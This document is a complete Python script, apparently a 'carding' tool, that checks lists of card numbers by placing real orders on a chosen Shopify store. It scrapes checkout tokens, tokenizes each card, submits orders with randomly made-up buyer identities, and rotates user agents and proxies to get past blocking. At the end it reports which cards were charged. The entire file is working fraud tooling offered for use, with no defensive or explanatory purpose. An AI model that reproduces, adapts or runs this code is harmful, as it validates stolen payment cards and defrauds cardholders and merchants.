import requests
import re
import time
import random
import string
import uuid
import sys
import ssl
import json
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXY_RAW = ""
USE_PROXY = False

_PROXY_ERROR_SIGS = [
    '<html', '<!doctype', 'proxy error', 'proxy refused',
    'connection refused', 'connection reset', 'tunnel connection failed',
    '502 bad gateway', '503 service', '504 gateway',
    'access denied', 'forbidden', 'cloudflare',
]

def _is_bad_response(text):
    if not text:
        return True
    txt = text.strip().lower()
    for sig in _PROXY_ERROR_SIGS:
        if sig in txt:
            return True
    if txt and txt[0] not in ('{', '['):
        return True
    return False

def safe_json(resp, label="response"):
    try:
        txt = resp.text
    except:
        return None
    if _is_bad_response(txt):
        return None
    try:
        return json.loads(txt)
    except (json.JSONDecodeError, ValueError):
        return None

def parse_proxy(proxy_str):
    parts = proxy_str.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    return None

PROXY_URL = parse_proxy(PROXY_RAW)

def create_proxy_session():
    session = requests.Session()
    if USE_PROXY and PROXY_URL:
        session.proxies = {"http": PROXY_URL, "https": PROXY_URL}
        session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

TIMEOUT_FAST = 60
TIMEOUT_SUBMIT = 60
TIMEOUT_POLL = 20

print_lock = threading.Lock()
results_lock = threading.Lock()
charged_cards = []

shared_product = {'variant_id': None, 'price': None, 'handle': None}


def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_name():
    first = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia']
    last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return random.choice(first), random.choice(last)

def random_address():
    data = [
        ('1600 Pennsylvania Ave NW', '', 'Washington', 'DC', '20500', '202'),
        ('350 Fifth Avenue', '', 'New York', 'NY', '10118', '212'),
        ('233 S Wacker Dr', '', 'Chicago', 'IL', '60606', '312'),
        ('1 Infinite Loop', '', 'Cupertino', 'CA', '95014', '408'),
        ('1 Microsoft Way', '', 'Redmond', 'WA', '98052', '425'),
    ]
    addr = random.choice(data)
    phone = f"+1{addr[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
    return {'address1': addr[0], 'address2': addr[1], 'city': addr[2], 'countryCode': 'US', 
            'postalCode': addr[4], 'zoneCode': addr[3], 'phone': phone}

def random_ua():
    chrome_ver = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36'


def find_cheapest_product(site, proxy_str=None):
    session = create_proxy_session()
    # if a proxy string was provided in the request, apply it to this session
    if proxy_str:
        parsed = parse_proxy(proxy_str)
        if parsed:
            session.proxies = {"http": parsed, "https": parsed}
            session.verify = False
    session.headers.update({"User-Agent": random_ua()})
    
    try:
        resp = session.get(f"https://{site}/products.json?limit=250", timeout=15)
        if resp.status_code != 200:
            return None, None, None, "PRODUCTS_FETCH_FAILED"
        
        data = safe_json(resp, "products")
        if not data:
            return None, None, None, "INVALID_JSON_FROM_PRODUCTS"
        products = data.get('products', [])
        cheapest_variant = None
        cheapest_price = float('inf')
        product_handle = None
        
        for product in products:
            for variant in product.get('variants', []):
                price = float(variant.get('price', 999999))
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest_variant = variant['id']
                    product_handle = product.get('handle', '')
        
        if not cheapest_variant:
            return None, None, None, "NO_PRODUCT_FOUND"
        
        return cheapest_variant, cheapest_price, product_handle, "OK"
    except Exception as e:
        return None, None, None, str(e)[:50]


def create_checkout_session(site, variant_id, product_handle):
    ua = random_ua()
    session = create_proxy_session()
    session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=TIMEOUT_FAST)
        if resp.status_code != 200:
            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=TIMEOUT_FAST)
            if resp.status_code != 200:
                return None, 'ERROR', 'ADD_TO_CART_FAILED'
        
        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=TIMEOUT_FAST)
        if 'checkout' not in resp.url:
            return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
        
        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=TIMEOUT_FAST)
        checkout_text = checkout_resp.text
        
        lower = checkout_text.lower()
        if 'verifying your connection' in lower or 'checking your browser' in lower:
            return None, 'VERIFY', 'VERIFY_BROWSER'
        if 'access denied' in lower:
            return None, 'BLOCKED', 'ACCESS_DENIED'
        
        sig_patterns = [
            r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
            r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
            r'callerIdentificationSignature["\s:]+([^"&\s]+)',
        ]
        shopify_sig = None
        for pattern in sig_patterns:
            m = re.search(pattern, checkout_text)
            if m:
                shopify_sig = m.group(1).replace('&quot;', '').strip()
                if shopify_sig and len(shopify_sig) > 10:
                    break
                shopify_sig = None
        
        if not shopify_sig:
            return None, 'ERROR', 'NO_SIGNATURE'
        
        m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
        session_token = m.group(1).replace('&quot;', '').strip() if m else None
        
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
        queue_token = m.group(1) if m else None
        
        m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
        stable_id = m.group(1) if m else str(uuid.uuid4())
        
        m = re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or re.search(r'/checkouts/([^/]+)/', checkout_resp.url)
        checkout_source_id = m.group(1) if m else ''
        
        m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
        
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
        payment_method_id = m.group(1) if m else None
        
        return {
            'site': site, 'session': session, 'ua': ua, 'sig': shopify_sig,
            'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
            'checkout_source_id': checkout_source_id, 'build_id': build_id, 'payment_method_id': payment_method_id,
            'checkout_url': checkout_resp.url
        }, 'OK', 'READY'
        
    except Exception as e:
        return None, 'ERROR', str(e)[:30]


def check_card(checkout_data, card, index, total, variant_id, price, require_shipping=None):
    try:
        parts = card.split("|")
        card_number, month = parts[0], int(parts[1])
        year = int("20" + parts[2]) if len(parts[2]) == 2 else int(parts[2])
        cvv = parts[3].strip()
        
        site = checkout_data['site']
        session = checkout_data['session']
        ua = checkout_data['ua']
        sig = checkout_data['sig']
        session_token = checkout_data['session_token']
        queue_token = checkout_data['queue_token']
        stable_id = checkout_data['stable_id']
        checkout_source_id = checkout_data['checkout_source_id']
        build_id = checkout_data['build_id']
        payment_method_id = checkout_data['payment_method_id']
        checkout_url = checkout_data['checkout_url']
        
        first_name, last_name = random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = random_address()
        addr['firstName'], addr['lastName'] = first_name, last_name
        
        pay_session = create_proxy_session()
        pay_headers = {'accept': 'application/json', 'content-type': 'application/json', 
                       'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
        pay_json = {'credit_card': {'number': card_number, 'month': month, 'year': year, 'verification_value': cvv, 
                    'name': cardholder}, 'payment_session_scope': site.replace('www.', '')}
        
        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=TIMEOUT_FAST)
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', 'PCI_FAILED', price)
        
        pay_data = safe_json(resp, "payment tokenization")
        if not pay_data:
            return (index, total, card, 'ERROR', 'INVALID_PCI_RESPONSE', price)
        payment_session_id = pay_data.get('id')
        if not payment_session_id:
            return (index, total, card, 'ERROR', 'NO_SESSION_ID', price)
        
        if require_shipping:
            delivery = {
                'deliveryLines': [{'destination': {'streetAddress': addr},
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        else:
            delivery = {
                'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        
        gql_headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}',
            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token or '',
            'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
        
        gql_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
                    'delivery': delivery,
                    'merchandise': {'merchandiseLines': [{'stableId': stable_id, 
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}', 
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}}]},
                    'payment': {'totalAmount': {'any': True}, 
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id or '', 
                            'sessionId': payment_session_id, 'billingAddress': {'streetAddress': addr}}}, 'amount': {'any': True}}],
                        'billingAddress': {'streetAddress': addr}},
                    'buyerIdentity': {'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}, 'email': email},
                    'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
                    'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
                },
                'attemptToken': f"{checkout_source_id}-{random_string(11)}",
            },
            'operationName': 'SubmitForCompletion',
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
        }
        
        resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'}, 
                           headers=gql_headers, json=gql_data, timeout=TIMEOUT_SUBMIT)
        
        if resp.status_code != 200:
            return (index, total, card, 'ERROR', f'HTTP_{resp.status_code}', price)
        
        result = safe_json(resp, "submit mutation")
        if not result:
            return (index, total, card, 'ERROR', 'INVALID_SUBMIT_RESPONSE', price)
        resp_text = resp.text.lower()
        
        if 'errors' in result:
            err = result['errors'][0].get('message', 'ERROR')[:40]
            if 'delivery' in err.lower() and require_shipping is None:
                return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
            return (index, total, card, 'ERROR', err, price)
        
        completion = result.get('data', {}).get('submitForCompletion', {})
        if not completion:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
            if 'insufficient' in resp_text:
                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
            return (index, total, card, 'ERROR', 'NO_COMPLETION', price)
        
        typename = completion.get('__typename', '')
        
        if not typename:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
            if 'insufficient' in resp_text:
                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
            if 'expired' in resp_text:
                return (index, total, card, 'DECLINED', 'EXPIRED_CARD', price)
            if 'invalid' in resp_text:
                return (index, total, card, 'DECLINED', 'INVALID_CARD', price)
            return (index, total, card, 'ERROR', resp.text[:50].replace('\n', ' '), price)
        
        if typename == 'SubmitRejected':
            errors = completion.get('errors', [])
            if errors:
                err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                if 'DELIVERY' in err and require_shipping is None:
                    return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
                return (index, total, card, 'DECLINED', err, price)
            return (index, total, card, 'DECLINED', 'REJECTED', price)
        
        if typename == 'SubmitFailed':
            return (index, total, card, 'DECLINED', completion.get('reason', 'FAILED'), price)
        
        receipt = completion.get('receipt', {})
        receipt_type = receipt.get('__typename', '')
        receipt_id = receipt.get('id')
        
        if receipt_type == 'ProcessedReceipt' or receipt.get('orderStatusPageUrl'):
            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
        
        if receipt_type == 'FailedReceipt':
            err = receipt.get('processingError', {}).get('code', 'FAILED')
            return (index, total, card, 'DECLINED', err, price)
        
        if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
            poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
            for _ in range(15):
                time.sleep(2)
                try:
                    poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=TIMEOUT_POLL)
                    if poll_resp.status_code == 200:
                        poll_data = safe_json(poll_resp, "poll receipt")
                        if not poll_data:
                            continue
                        poll_receipt = poll_data.get('data', {}).get('receipt', {})
                        poll_type = poll_receipt.get('__typename', '')
                        
                        if poll_type == 'ProcessedReceipt' and poll_receipt.get('orderStatusPageUrl'):
                            return (index, total, card, 'CHARGED', 'ORDER_PLACED', price)
                        
                        if poll_type == 'FailedReceipt':
                            err = poll_receipt.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                            return (index, total, card, 'DECLINED', err, price)
                        
                        if poll_type in ['ProcessingReceipt', 'WaitingReceipt']:
                            continue
                except:
                    pass
            return (index, total, card, 'ERROR', 'POLL_TIMEOUT', price)
        
        if typename == 'Throttled':
            return (index, total, card, 'ERROR', 'THROTTLED', price)
        
        if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
            return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
        if 'insufficient' in resp_text:
            return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
        
        return (index, total, card, 'ERROR', typename if typename else resp.text[:40].replace('\n', ' '), price)
        
    except Exception as e:
        return (index, total, card, 'ERROR', str(e)[:40], price)


def process_card(args):
    card, index, total, site, variant_id, price, product_handle = args
    
    checkout_data, status, msg = create_checkout_session(site, variant_id, product_handle)
    
    if status != 'OK':
        return (index, total, card, status, msg, price)
    
    return check_card(checkout_data, card, index, total, variant_id, price)


def main():
    if len(sys.argv) < 3:
        print("Usage: python shopify.py <cc_file.txt> <site> [threads]", flush=True)
        sys.exit(1)
    
    cc_file = sys.argv[1]
    site = sys.argv[2].replace("https://", "").replace("http://", "").strip().rstrip("/")
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    
    try:
        with open(cc_file, 'r') as f:
            cards = [line.strip() for line in f if line.strip() and '|' in line and len(line.split('|')) >= 4]
    except FileNotFoundError:
        print(f"File not found: {cc_file}", flush=True)
        sys.exit(1)
    
    if not cards:
        print("No valid cards found", flush=True)
        sys.exit(1)
    
    total = len(cards)
    print(f"Finding cheapest product on {site}...", flush=True)
    
    variant_id, price, product_handle, status = find_cheapest_product(site)
    if not variant_id:
        print(f"Failed: {status}", flush=True)
        sys.exit(1)
    
    print(f"Found product: ${price:.2f} (variant: {variant_id})", flush=True)
    print(f"Loaded {total} cards | Threads: {threads}", flush=True)
    print("=" * 60, flush=True)
    
    tasks = [(card, i, total, site, variant_id, price, product_handle) for i, card in enumerate(cards, 1)]
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(process_card, task): task for task in tasks}
        
        for future in as_completed(futures):
            try:
                result = future.result()
                idx, tot, card_display, res_status, res_msg, res_price = result[:6]
                
                if res_status == 'CHARGED':
                    with results_lock:
                        charged_cards.append(card_display)
                elif res_status == 'DECLINED':
                    emoji = '❌'
                elif res_status in ['BLOCKED', 'VERIFY']:
                    emoji = '🚫'
                else:
                    emoji = '⚠️'
                
                with print_lock:
                    print(f"[{idx}/{tot}] {card_display} | {res_msg} | ${res_price:.2f} | {res_status} {emoji}", flush=True)
                
            except Exception as e:
                with print_lock:
                    print(f"Thread error: {e}", flush=True)
    
    print("=" * 60, flush=True)
    print(f"Done! Charged: {len(charged_cards)}/{total}", flush=True)
    if charged_cards:
        print("\nCharged:", flush=True)
        for cc in charged_cards:
            print(f"  {cc}", flush=True)


if __name__ == "__main__":
    main()
